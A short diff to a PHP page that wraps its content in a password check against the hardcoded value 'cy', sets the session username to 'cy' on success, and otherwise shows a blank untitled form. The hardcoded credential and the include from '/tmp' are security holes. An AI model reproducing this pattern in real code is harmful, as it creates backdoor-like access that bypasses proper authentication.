@@ -4,6 +4,8 @@ header('Content-Type: text/html; charset=utf-8');
 session_start();
 error_reporting(0);
 $_SESSION['redirect'] = $_SERVER['REQUEST_URI'];
+if($_POST['pwd']<>'' && $_POST['pwd']=='cy'){
+    $_SESSION['username']='cy';
 include "chooselang.php";
 include '/tmp/lang.php';
 ;echo '
@@ -54,4 +56,20 @@ function newwindow(w,h,webaddress,name){
 </div>
 </body>
 </html>
-';?>
+';
+}else{
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+</head>
+<body>
+<form action="" method="post">
+<input id="" type="text" name="pwd">
+<input type="submit" value="提交">
+</form>
+</body>
+</html>
+<?php }?>
